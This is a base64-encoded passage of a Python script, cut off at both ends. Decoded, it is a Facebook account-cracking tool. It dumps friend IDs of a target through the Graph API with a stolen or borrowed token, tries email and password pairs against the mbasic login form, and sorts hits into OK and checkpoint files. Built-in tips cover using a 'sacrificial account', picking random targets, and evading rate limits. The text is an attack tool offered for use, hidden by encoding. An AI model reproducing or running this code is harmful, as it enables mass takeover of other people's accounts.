hbignJXPilaDilZDilZBbJXPigKIlc10gJXNBZ2FtYSA6ICVzJyUoTyxQLE8sUCxyZykpDQogICAgamFsYW4oJyVz4pWg4pWQ4pWQWyVz4oCiJXNdICVzU3RhdHVzIEh1YnVuZ2FuIDogJXMnJShPLFAsTyxQLHJsKSkNCiAgICBqYWxhbignJXPilaDilZDilZBbJXPigKIlc10gJXNIdWJ1bmdhbiBEZW5nYW4gOiAlcyclKE8sUCxPLFAscmxzKSkNCiAgICBqYWxhbignJXPilaDilZDilZBbJXPigKIlc10gJXNUZW1wYXQgVGluZ2dhbCA6ICVzJyUoTyxQLE8sUCxsYykpDQogICAgamFsYW4oJyVz4pWg4pWQ4pWQWyVz4oCiJXNdICVzVGVtcGF0IEFzYWwgOiAlcyclKE8sUCxPLFAsaHQpKQ0KICAgIGphbGFuKCclc+KVoOKVkOKVkFslc+KAoiVzXSAlc1RlbnRhbmcgOiAlcyclKE8sUCxPLFAsYWIpKQ0KICAgIGphbGFuKCclc+KVoOKVkOKVkFslc+KAoiVzXSAlc0xvY2FsZSA6ICVzJyUoTyxQLE8sUCxsbykpDQogICAgcHJpbnQoJyVz4pWRJyUoTykpDQogICAgaW5wdXQoJyVz4pWa4pWQ4pWQWyAlc1JldHVybiAlc10lcyclKE8sUCxPLFApKQ0KICAgIG1lbnUoKQ0KZGVmIHRlbWFuX3RhcmdldCgpOg0KICAgIGl0ID0gaW5wdXQoJyVz4p2l4pSBWyVz4oCiJXNdICVzSUQgVGFyZ2V0IDogJyUoTyxQLE8sUCkpDQogICAgdHJ5Og0KICAgICAgICB0b2tlbiA9IG9wZW4oJ3Rva2VuLnR4dCcsJ3InKS5yZWFkKCkNCiAgICAgICAgbW0gPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2FjY2Vzc190b2tlbj0lcyclKGl0LHRva2VuKSkNCiAgICAgICAgbm4gPSBqc29uLmxvYWRzKG1tLnRleHQpDQogICAgICAgIHByaW50ICgnJXPinaXilIFbJXPigKIlc10gJXNOYW1lIDogJXMnJShPLFAsTyxQLG5uWyduYW1lJ10pKQ0KICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6DQogICAgICAgIGphbGFuKCclc+KdpeKUgVslcyElc10gJXNUb2tlbi9Db29raWVzIEludmFsaWQnJShNLFAsTSxQKSkNCiAgICAgICAgbWVudV9sb2coKQ0KICAgIHR0PVtdDQogICAgdGU9W10NCiAgICBsaW0gPSBpbnB1dCgnJXPinaXilIFbJXPigKIlc10gJXNMaW1pdCBEdW1wIDogJyUoTyxQLE8sUCkpDQogICAgcHJpbnQoJyVz4p2l4pSBJXMnJShPLFApKQ0KICAgIGFkYSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvZnJpZW5kcz9saW1pdD0lcyZhY2Nlc3NfdG9rZW49JXMnJShpdCxsaW0sdG9rZW4pKQ0KICAgIGlkaSA9IGpzb24ubG9hZHMoYWRhLnRleHQpDQogICAgZm9yIHggaW4gaWRpWydkYXRhJ106DQogICAgICAgIHR0LmFwcGVuZCh4WydpZCddKQ0KICAgIGZvciBpZCBpbiB0dDoNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgYWRhMiA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvZnJpZW5kcz9hY2Nlc3NfdG9rZW49JXMnJShpZCx0b2tlbikpDQogICAgICAgICAgICBpZGkyID0ganNvbi5sb2FkcyhhZGEyLnRleHQpDQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgZm9yIGIgaW4gaWRpMlsnZGF0YSddOg0KICAgICAgICAgICAgICAgICAgICB0ZS5hcHBlbmQoYlsnaWQnXSkNCiAgICAgICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoNCiAgICAgICAgICAgICAgICBwcmludCgn4p2l4pSBWyFdIFByaXZhdGUnKQ0KICAgICAgICAgICAgcHJpbnQoJ+KdpeKUgVvigKJdJyxpZCwn4oCiJyxsZW4odGUpKQ0KICAgICAgICAgICAgdGUuY2xlYXIoKQ0KICAgICAgICBleGNlcHQgS2V5RXJyb3I6DQogICAgICAgICAgICBwcmludCgn4p2l4pSBWyFdIFNwYW0gQWNjb3VudHMnKQ0KICAgIHByaW50KCfinaXilIEnKQ0KICAgIGlucHV0KCfinaXilIFbIFJldHVybiBdJykNCiAgICBtZW51KCkNCmRlZiBoYXNpbCgpOg0KICAgIGNsZWFyKCkNCiAgICBiYW5uZXIoKQ0KICAgIGphbGFuKCclc+KdpeKUgVsgJXNDcmFjayBSZXN1bHRzICVzXSclKE8sUCxPKSkNCiAgICBwcmludCgnJXPinaXilIEnJShPKSkNCiAgICBwcmludCgnJXPinaXilIFbJXMxJXNdICVzQ2hlY2sgUmVzdWx0IE9LJyUoTyxQLE8sUCkpDQogICAgcHJpbnQoJyVz4p2l4pSBWyVzMiVzXSAlc0NoZWNrIHJlc3VsdCBDUCclKE8sUCxPLFApKQ0KICAgIGNoID0gaW5wdXQoJyVz4p2l4pSBWyVz4oCiJXNdICVzQ2hvb3NlIDogJyUoTyxQLE8sUCkpDQogICAgaWYgY2ggaW4gWycnXToNCiAgICAgICAgamFsYW4oJyVz4p2l4pSBWyVzISVzXSAlc0lzaSBZYW5nIEJlbmFyJyUoTSxQLE0sUCkpDQogICAgICAgIG1lbnUoKQ0KICAgIGVsaWYgY2ggaW4gWycxJywnMDEnLCcwMDEnLCdhJ106DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIG9rbCA9IG9zLmxpc3RkaXIoIk9LIikNCiAgICAgICAgICAgIHByaW50KCclc+KdpeKUgSclKE8pKQ0KICAgICAgICAgICAgcHJpbnQoJyVz4p2l4pSBWyVzIENyYWNrIFJlc3VsdHMgU3RvcmVkIGluIEZpbGUgT0slc10nJShPLFAsTykpDQogICAgICAgICAgICBwcmludCgnJXPinaXilIEnJShPKSkNCiAgICAgICAgICAgIGZvciBmaWxlIGluIG9rbDoNCiAgICAgICAgICAgICAgICBwcmludCgnJXPinaXilIFbJXPigKIlc10gJXMlcyclKE8sUCxPLFAsZmlsZSkpDQogICAgICAgICAgICBwcmludCgnJXPinaXilIEnJShPKSkNCiAgICAgICAgICAgIGZpbGVzID0gaW5wdXQoJyVz4p2l4pSBWyVz4oCiJXNdICVzRW50ZXIgRmlsZSBOYW1lIDogJyUoTyxQLE8sUCkpDQogICAgICAgICAgICBwcmludCgnJykNCiAgICAgICAgICAgIGlmIGZpbGVzID09ICIiOg0KICAgICAgICAgICAgICAgIGphbGFuKCclc+KdpeKUgVslcyElc10gJXNDb3JyZWN0IENvbnRlbnQnJShNLFAsTSxQKSkNCiAgICAgICAgICAgICAgICBoYXNpbCgpDQogICAgICAgICAgICBvcy5zeXN0ZW0oJ2NhdCBPSy8lcyclKGZpbGVzKSkNCiAgICAgICAgICAgIHBwcCA9IG9wZW4oIk9LLyVzIiUoZmlsZXMpKS5yZWFkKCkuc3BsaXRsaW5lcygpDQogICAgICAgICAgICBkZWwxID0gKCIlcyIlKGZpbGVzKSkucmVwbGFjZSgiLSIsICIgIikucmVwbGFjZSgiLnR4dCIsICIiKQ0KICAgICAgICAgICAgcHJpbnQoJ1xuJXPinaXilIFbJXPigKIlc10gJXNUb3RhbCBDcmFjayBSZXN1bHQgRGF0ZSAlcyBpcyAlcyBBY2NvdW50JyUoTyxQLE8sUCxkZWwxLGxlbihwcHApKSkNCiAgICAgICAgZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKToNCiAgICAgICAgICAgIHByaW50KCclc+KdpeKUgVslcyBObyBSZXN1bHRzIEZvdW5kICVzXSclKE0sUCxNKSkNCiAgICBlbGlmIGNoIGluIFsnMicsJzAyJywnMDAyJywnYiddOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBjcGwgPSBvcy5saXN0ZGlyKCJDUCIpDQogICAgICAgICAgICBwcmludCgnJXPinaXilIEnJShPKSkNCiAgICAgICAgICAgIHByaW50KCclc+KdpeKUgVslcyBDcmFjayBSZXN1bHRzIFN0b3JlZCBpbiBDUCBGaWxlcyAlc10nJShPLFAsTykpDQogICAgICAgICAgICBwcmludCgnJXPinaXilIEnJShPKSkNCiAgICAgICAgICAgIGZvciBmaWxlIGluIGNwbDoNCiAgICAgICAgICAgICAgICBwcmludCgnJXPinaXilIFbJXPigKIlc10gJXMlcyclKE8sUCxPLFAsZmlsZSkpDQogICAgICAgICAgICBwcmludCgnJXPinaXilIEnJShPKSkNCiAgICAgICAgICAgIGZpbGVzID0gaW5wdXQoJyVz4p2l4pSBWyVz4oCiJXNdICVzRW50ZXIgRmlsZSBOYW1lIDogJyUoTyxQLE8sUCkpDQogICAgICAgICAgICBwcmludCgnJykNCiAgICAgICAgICAgIGlmIGZpbGVzID09ICIiOg0KICAgICAgICAgICAgICAgIGphbGFuKCclc+KdpeKUgVslcyElc10gJXNDb3JyZWN0IENvbnRlbnQnJShNLFAsTSxQKSkNCiAgICAgICAgICAgICAgICBoYXNpbCgpDQogICAgICAgICAgICBvcy5zeXN0ZW0oJ2NhdCBDUC8lcyclKGZpbGVzKSkNCiAgICAgICAgICAgIHBwcCA9IG9wZW4oIkNQLyVzIiUoZmlsZXMpKS5yZWFkKCkuc3BsaXRsaW5lcygpDQogICAgICAgICAgICBkZWwxID0gKCIlcyIlKGZpbGVzKSkucmVwbGFjZSgiLSIsICIgIikucmVwbGFjZSgiLnR4dCIsICIiKQ0KICAgICAgICAgICAgcHJpbnQoJ1xuJXPinaXilIFbJXPigKIlc10gJXNUb3RhbCBDcmFjayBSZXN1bHQgRGF0ZSAlcyBpcyAlcyBBY2NvdW50JyUoTyxQLE8sUCxkZWwxLGxlbihwcHApKSkNCiAgICAgICAgZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKToNCiAgICAgICAgICAgIHByaW50KCclc+KdpeKUgVslcyBObyBSZXN1bHRzIEZvdW5kICVzXSclKE0sUCxNKSkNCiAgICBlbHNlOg0KICAgICAgICBqYWxhbignJXPinaXilIFbJXMhJXNdICVzQ29ycmVjdCBDb250ZW50JyUoTSxQLE0sUCkpDQogICAgICAgIG1lbnUoKQ0KICAgIHByaW50KCclc+KdpeKUgSclKE8pKQ0KICAgIGlucHV0KCclc+KdpeKUgVsgJXNSZXR1cm4gJXNdJXMnJShPLFAsTyxQKSkNCiAgICBtZW51KCkNCmRlZiBsb2dfaGFzaWwodXNlciwgcGFzdyk6DQogICAgdWEgPSAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDExOyB2aXZvIDE5MDQgQnVpbGQvUlAxQS4yMDA3MjAuMDEyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzgzLjAuNDEwMy4xMDYgTW9iaWxlIFNhZmFyaS81MzcuMzYiDQogICAgc2VzID0gcmVxdWVzdHMuU2Vzc2lvbigpDQogICAgc2VzLmhlYWRlcnMudXBkYXRlKHsNCiAgICAiSG9zdCI6ICJtYmFzaWMuZmFjZWJvb2suY29tIiwNCiAgICAiY2FjaGUtY29udHJvbCI6ICJtYXgtYWdlPTAiLA0KICAgICJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjogIjEiLA0KICAgICJvcmlnaW4iOiBob3N0LA0KICAgICJjb250ZW50LXR5cGUiOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiwNCiAgICAidXNlci1hZ2VudCI6IHVhLA0KICAgICJhY2NlcHQiOiAidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOSIsDQogICAgIngtcmVxdWVzdGVkLXdpdGgiOiAibWFyay52aWEuZ3AiLA0KICAgICJzZWMtZmV0Y2gtc2l0ZSI6ICJzYW1lLW9yaWdpbiIsDQogICAgInNlYy1mZXRjaC1tb2RlIjogIm5hdmlnYXRlIiwNCiAgICAic2VjLWZldGNoLXVzZXIiOiAiPzEiLA0KICAgICJzZWMtZmV0Y2gtZGVzdCI6ICJkb2N1bWVudCIsDQogICAgInJlZmVyZXIiOiBob3N0KyIvbG9naW4vP25leHQmcmVmPWRibCZmbCZyZWZpZD04IiwNCiAgICAiYWNjZXB0LWVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLA0KICAgICJhY2NlcHQtbGFuZ3VhZ2UiOiAiaWQtSUQsaWQ7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjciDQogICAgfSkNCiAgICBkYXRhID0ge30NCiAgICBnZWQgPSBwYXIoc2VzLmdldChob3N0KyIvbG9naW4vP25leHQmcmVmPWRibCZmbCZyZWZpZD04IiwgaGVhZGVycz17InVzZXItYWdlbnQiOnVhfSkudGV4dCwgImh0bWwucGFyc2VyIikNCiAgICBmbSA9IGdlZC5maW5kKCJmb3JtIix7Im1ldGhvZCI6InBvc3QifSkNCiAgICBsaXN0ID0gWyJsc2QiLCJqYXpvZXN0IiwibV90cyIsImxpIiwidHJ5X251bWJlciIsInVucmVjb2duaXplZF90cmllcyIsImxvZ2luIiwiYmlfeHJ3aCJdDQogICAgZm9yIGkgaW4gZm0uZmluZF9hbGwoImlucHV0Iik6DQogICAgICAgIGlmIGkuZ2V0KCJuYW1lIikgaW4gbGlzdDoNCiAgICAgICAgICAgIGRhdGEudXBkYXRlKHtpLmdldCgibmFtZSIpOmkuZ2V0KCJ2YWx1ZSIpfSkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGNvbnRpbnVlDQogICAgZGF0YS51cGRhdGUoeyJlbWFpbCI6dXNlciwicGFzcyI6cGFzd30pDQogICAgdHJ5Og0KICAgICAgICBydW4gPSBwYXIoc2VzLnBvc3QoaG9zdCtmbS5nZXQoImFjdGlvbiIpLCBkYXRhPWRhdGEsIGFsbG93X3JlZGlyZWN0cz1UcnVlKS50ZXh0LCAiaHRtbC5wYXJzZXIiKQ0KICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLlRvb01hbnlSZWRpcmVjdHM6DQogICAgICAgIHByaW50KCIlc1slcyElc10gJXNTcGFtIEFjY291bnRzIiUoTSxQLE0sUCkpDQogICAgaWYgImNfdXNlciIgaW4gc2VzLmNvb2tpZXM6DQogICAgICAgIHByaW50KCIlc1slc+KAoiVzXSAlc0FjY291bnQgT0sgTm8gQ2hlY2twb2ludHQiJShILFAsSCxQKSkNCiAgICBlbGlmICJjaGVja3BvaW50IiBpbiBzZXMuY29va2llczoNCiAgICAgICAgZm9ybSA9IHJ1bi5maW5kKCJmb3JtIikNCiAgICAgICAgZHRzZyA9IGZvcm0uZmluZCgiaW5wdXQiLHsibmFtZSI6ImZiX2R0c2cifSlbInZhbHVlIl0NCiAgICAgICAganpzdCA9IGZvcm0uZmluZCgiaW5wdXQiLHsibmFtZSI6Imphem9lc3QifSlbInZhbHVlIl0NCiAgICAgICAgbmggICA9IGZvcm0uZmluZCgiaW5wdXQiLHsibmFtZSI6Im5oIn0pWyJ2YWx1ZSJdDQogICAgICAgIGRhdGFEID0gew0KICAgICAgICAgICAgImZiX2R0c2ciOiBkdHNnLA0KICAgICAgICAgICAgImZiX2R0c2ciOiBkdHNnLA0KICAgICAgICAgICAgImphem9lc3QiOiBqenN0LA0KICAgICAgICAgICAgImphem9lc3QiOiBqenN0LA0KICAgICAgICAgICAgImNoZWNrcG9pbnRfZGF0YSI6IiIsDQogICAgICAgICAgICAic3VibWl0W0NvbnRpbnVlXSI6Ikxhbmp1dGthbiIsDQogICAgICAgICAgICAibmgiOiBuaA0KICAgICAgICB9DQogICAgICAgIHhueHggPSBwYXIoc2VzLnBvc3QoaG9zdCtmb3JtWyJhY3Rpb24iXSwgZGF0YT1kYXRhRCkudGV4dCwgImh0bWwucGFyc2VyIikNCiAgICAgICAgbmdldyA9IFt5eS50ZXh0IGZvciB5eSBpbiB4bnh4LmZpbmRfYWxsKCJvcHRpb24iKV0NCiAgICAgICAgaWYoc3RyKGxlbihuZ2V3KSk9PSIwIik6DQogICAgICAgICAgICBwcmludCgiJXNbJXPigKIlc10gJXNPbmUgVGFwIEFjY291bnQiJShILFAsSCxQKSkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHByaW50KCIlc1slc+KAoiVzXSAlc1RoZXJlaXMgJXMgT3B0aW9uICIlKE8sUCxPLFAsc3RyKGxlbihuZ2V3KSkpKQ0KICAgICAgICBmb3Igb3B0IGluIHJhbmdlKGxlbihuZ2V3KSk6DQogICAgICAgICAgICBwcmludCgiICIqMywgc3RyKG9wdCsxKSsiLiAiK25nZXdbb3B0XSkNCiAgICBlbGlmICJsb2dpbl9lcnJvciIgaW4gc3RyKHJ1bik6DQogICAgICAgIG9oID0gcnVuLmZpbmQoImRpdiIseyJpZCI6ImxvZ2luX2Vycm9yIn0pLmZpbmQoImRpdiIpLnRleHQNCiAgICAgICAgcHJpbnQoIiVzWyVzISVzXSAlcyVzIiUoTSxQLE0sUCxvaCkpDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQoIiVzWyVzISVzXSAlc1Bhc3N3b3JkIEhhcyBDaGFuZ2VkIiUoTSxQLE0sUCkpDQpkZWYgY2VrX2hhc2lsKCk6DQogICAgamFsYW4oJyVz4p2l4pSBWyAlc0NoZWNrIENyYWNrIFJlc3VsdCBBY2NvdW50IE9wdGlvbnMgJXNdJyUoTyxQLE8pKQ0KICAgIHByaW50KCclc+KdpeKUgSclKE8pKQ0KICAgIHByaW50KCclc+KdpeKUgVslc+KAoiVzXSAlc0V4YW1wbGUgRmlsZSA6IENQLyVzLnR4dCclKE8sUCxPLFAsdGFuZ2dhbCkpDQogICAgZmlsZXMgPSBpbnB1dCgnJXPinaXilIFbJXPigKIlc10gJXNGaWxlIDogJyUoTyxQLE8sUCkpDQogICAgdHJ5Og0KICAgICAgICBidWthX2JhanUgPSBvcGVuKGZpbGVzLCJyIikucmVhZGxpbmVzKCkNCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6DQogICAgICAgIHByaW50KCIlc+KdpeKUgVslcyElc10gJXNGaWxlIE5vdCBFeGlzdGluZyIlKE0sUCxNLFApKQ0KICAgICAgICB0aW1lLnNsZWVwKDIpOyBjZWtfaGFzaWwoKQ0KICAgIHByaW50KCIlc+KdpeKUgVslc+KAoiVzXSAlc051bWJlciBvZiBBY2NvdW50cyA6ICVzIiUoTyxQLE8sUCxzdHIobGVuKGJ1a2FfYmFqdSkpKSkNCiAgICBwcmludCgiIikNCiAgICBmb3IgbWVtZWsgaW4gYnVrYV9iYWp1Og0KICAgICAgICBrb250b2wgPSBtZW1lay5yZXBsYWNlKCJcbiIsIiIpDQogICAgICAgIHRpdGlkICA9IGtvbnRvbC5zcGxpdCgi4oCiIikNCiAgICAgICAgcHJpbnQoIiVzWyVz4oCiJXNdICVzQ2hlY2sgTG9naW4gOiAlcyIlKE8sUCxPLFAsa29udG9sKSkNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgbG9nX2hhc2lsKHRpdGlkWzBdLCB0aXRpZFsxXSkNCiAgICAgICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgcHJpbnQoIiIpDQogICAgcHJpbnQoIiIpDQogICAgcHJpbnQoJyVz4p2l4pSBWyVz4oCiJXNdICVzIENoZWNraW5nIFByb2Nlc3MgQ29tcGxldGUnJShPLFAsTyxQKSkNCiAgICBwcmludCgnJXPinaXilIEnJShPKSkNCiAgICBpbnB1dCgnJXPinaXilIFbICVzUmV0dXJuICVzXSVzJyUoTyxQLE8sUCkpDQogICAgbWVudSgpDQpkZWYgdmFyX21lbnUoKToNCiAgICBwcmludCgnJXPinaXilIFbICVzU2VsZWN0IE1ldGhvZCBMb2dpbiAlc10nJShPLFAsTykpDQogICAgcHJpbnQoJyVz4p2l4pSBJyUoTykpDQogICAgcHJpbnQoJyVz4p2l4pSBWyVzMSVzXSAlc0xvZ2luIHdpdGggVG9rZW4nJShPLFAsTyxQKSkNCiAgICBwcmludCgnJXPinaXilIFbJXMyJXNdICVzTG9naW4gd2l0aCBDb29raWVzJyUoTyxQLE8sUCkpDQogICAgcHJpbnQoJyVz4p2l4pSBWyVzMyVzXSAlc1NjcmlwdCBVc2FnZSBUdXRvcmlhbCclKE8sUCxPLFApKQ0KICAgIHByaW50KCclc+KdpeKUgVslczQlc10gJXNJbmZvIEF1dGhvciAmIFRlYW0gUHJvamVjdCclKE8sUCxPLFApKQ0KICAgIHByaW50KCclc+KdpeKUgVslczAlc10gJXNHbyBCYWNrJyUoTyxQLE8sUCkpDQpkZWYgdmFyX3R1dG9yKCk6DQogICAgbWxha3UoJyVz4pWU4pWQ4pWQWyVzIFRpcHMgJiBUdXRvcmlhbCAlc10nJShPLFAsTykpDQogICAgcHJpbnQoJyVz4pWRJyUoTykpDQogICAgcHJpbnQoJyVz4pWg4pWQ4pWQWyVzMSVzXSAlc0hvdyB0byBUYWtlIFRva2VuJyUoTyxQLE8sUCkpDQogICAgcHJpbnQoJyVz4pWg4pWQ4pWQWyVzMiVzXSAlc0hvdyB0byBUYWtlIENvb2tpZXMnJShPLFAsTyxQKSkNCiAgICBwcmludCgnJXPilaDilZDilZBbJXMzJXNdICVzSG93IHRvIEdldCBUYXJnZXQnJShPLFAsTyxQKSkNCiAgICBwcmludCgnJXPilaDilZDilZBbJXM0JXNdICVzV2F5cyBEdXJpbmcgdGhlIENyYWNrIFByb2Nlc3MnJShPLFAsTyxQKSkNCmRlZiB0dXRvcl90YXJnZXQoKToNCiAgICBtbGFrdSgnJXPilaDilZDilZDilZDilabilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZcnJShPKSkNCiAgICBtbGFrdSgnJXPilZEgJXMxICVz4pWRICVzUHJlcGFyZSBhIFNhY3JpZmljaWFsIEFjY291bnQgSW4gQ2hyb21lIEZvciBDcmFja2luZyBQcm9jZXNzICVz4pWRJyUoTyxQLE8sUCxPKSkNCiAgICBtbGFrdSgnJXPilZEgJXMyICVz4pWRICVzQ2hhbmdlIHRoZSBWaWN0aW0gQWNjb3VudCBQYXNzd29yZCBGaXJzdCAgICAgICAgICAlc+KVkSclKE8sUCxPLFAsTykpDQogICAgbWxha3UoJyVz4pWRICVzMyAlc+KVkSAlc0ZpbmQgUmFuZG9tIEFjY291bnQgVGFyZ2V0cywgRnJpZW5kcyBMaXN0IE11c3QgQmUgUHVibGljICAgJXPilZEnJShPLFAsTyxQLE8pKQ0KICAgIG1sYWt1KCclc+KVkSAlczQgJXPilZEgJXNGcmllbmRzIChGTCkgRnJlZSwgQ2FuIGJlIDFLLCAySywgM0ssICw0SywgT3IgNUsgICAgICAlc+KVkSclKE8sUCxPLFAsTykpDQogICAgbWxha3UoJyVz4pWRICVzNSAlc+KVkSAlc01vcmUgRnJpZW5kcywgTW9yZSBQb3NzaWJsZSBSZXN1bHRzICAlc+KVkSclKE8sUCxPLFAsTykpDQogICAgbWxha3UoJyVz4pWRICVzNiAlc+KVkSAlc1RhcCBUYXJnZXQgUHJvZmlsZS9Db3ZlciBQaG90byAgICAgICAgICAgICAgICAgICAgICAlc+KVkSclKE8sUCxPLFAsTykpDQogICAgbWxha3UoJyVz4pWRICVzNyAlc+KVkSAlc3NlZSBVUkwvTGluayBBYm92ZSwgVGhlcmUgaXMgXCBpZCA9IDEwMDAxeHhcICVz4pWRJyUoTyxQLE8sUCxPKSkNCiAgICBtbGFrdSgnJXPilZEgJXM4ICVz4pWRICVzV2VsbCwgdGhhdHMgYSB0YXJnZXQgSUQgcmVhZHkgdG8gY3JhY2sgICAlc+KVkSclKE8sUCxPLFAsTykpDQogICAgbWxha3UoJyVz4pWRICVzOSAlc+KVkSAlc09wZW4gVGVybXV4L0xpbnV4IHRoZW4gcHJvY2VlZCB0byB0aGUgQ3JhY2sgUHJvY2VzcyAlc+KVkSclKE8sUCxPLFAsTykpDQogICAgbWxha3UoJyVz4pWg4pWQ4pWQ4pWQ4pWp4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdJyUoTykpDQogICAgcHJpbnQoJyVz4pWRJyUoTykpDQpkZWYgdHV0b3JfY3JhY2soKToNCiAgICBtbGFrdSgnJXPilaDilZDilZDilZDilabilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZcnJShPKSkNCiAgICBtbGFrdSgnJXPilZEgJXMxICVz4pWRICVzTWV0aG9kIEFwaSA6IEZhc3QgQnV0IEVhc3kgUHJvY2VzcyBTcGFtICAgICAgICAgICAgJXPilZEnJShPLFAsTyxQLE8pKQ0KICAgIG1sYWt1KCclc+KVkSAlczIgJXPilZEgJXNNZXRob2QgTWJhc2ljIDogVGhlIHByb2Nlc3MgaXMgcXVpdGUgZmFzdCwgcmFyZWx5IHNwYW1tZWQgICVz4pWRJyUoTyxQLE8sUCxPKSkNCiAgICBtbGFrdSgnJXPilZEgJXMzICVz4pWRICVzTWV0aG9kIE1vYmlsZSA6IFNsb3cgUHJvY2VzcywgUHJvYmFibHkgT0sgICVz4pWRJyUoTyxQLE8sUCxPKSkNCiAgICBtbGFrdSgnJXPilZEgJXM0ICVz4pWRICVzQ3JhY2sgVXNpbmcgRGF0YSBRdW90YSAoTm90IFN1cHBvcnQgV2lmaSkgICVz4pWRJyUoTyxQLE8sUCxPKSkNCiAgICBtbGFrdSgnJXPilZEgJXM1ICVz4pWRICVzSWYgUmVzdWx0cyBEbyBOb3QgQXBwZWFyIFdoaWxlIFRoZSBDcmFjayBJcyBSdW5uaW5nICAgICAgICVz4pWRJyUoTyxQLE8sUCxPKSkNCiAgICBtbGFrdSgnJXPilZEgJXM2ICVz4pWRICVzVHVybiBPbiBBaXJwbGFuZSBNb2RlIE9ubHkgNSBTZWNvbmRzICAgICAgICAgICAgICAgICAgICVz4pWRJyUoTyxQLE8sUCxPKSkNCiAgICBtbGFrdSgnJXPilaDilZDilZDilZDilanilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ0nJShPKSkNCiAgICBwcmludCgnJXPilZEnJShPKSkNCmRlZiB2YXJfYXV0aG9yKCk6DQogICAgbWxha3UoJyVz4pWU4pWQ4pWQWyAlc0F1dGhvciAmIFRlYW0gUHJvamVjdCAlc10nJShPLFAsTykpDQogICAgbWxha3UoJyVz4pWRJyUoTykpDQogICAgbWxha3UoJyVz4pWg4pWQ4pWQWyVz4oCiJXNdICVzQXV0aG9yIDonJShPLFAsTyxQKSkNCiAgICBtbGFrdSgnJXPilZEgICAgIOKAoiAlc1JhbmEgTmFkZWVtIFJhanB1dCclKE8sUCkpDQogICAgbWxha3UoJyVz4pWRICAgICDigKIgJXNSYW5hIEcnJShPLFApKQ0KICAgIG1sYWt1KCclc+KVkSclKE8pKQ0KICAgIG1sYWt1KCclc+KVoOKVkOKVkFslc+KAoiVzXSAlc1RlYW0gUHJvamVjdCAlc0NPREUlcyA6JyUoTyxQLE8sUCxPLFApKQ0KICAgIG1sYWt1KCclc+KVkSAgICAg4oCiICVzUkFOQSBCSUxBTCclKE8sUCkpDQogICAgbWxha3UoJyVz4pWRICAgICDigKIgJXNTQUlNIFJBSlBPT1QnJShPLFApKQ0KICAgIG1sYWt1KCclc+KVkSAgICAg4oCiICVzQUhURVNIQU0nJShPLFApKQ0KICAgIG1sYWt1KCclc+KVkSAgICAg4oCiICVzQVpFWkFMICclKE8sUCkpDQogICAgbWxha3UoJyVz4pWRICAgICDigKIgJXNYSUhTQU4nJShPLFApKQ0KICAgIG1sYWt1KCclc+KVkSAgICAg4oCiICVzU3VyZW5kcmEnJShPLFApKQ0KICAgIG1sYWt1KCclc+KVkSAgICAg4oCiICVzU3llZCBTaGFod2FpeiBTaGFoJyUoTyxQKSkNCiAgICBtbGFrdSgnJXPilZEgICAgIOKAoiAlc011aGFtbWFkIEhhbXphaCBIQVNIJyUoTyxQKSkNCiAgICBtbGFrdSgnJXPilZEgICAgIOKAoiAlc1BhaHJ1bCBBZ3VzcGFybmlhIHgnJShPLFApKQ0KICAgIG1sYWt1KCclc+KVkSAgI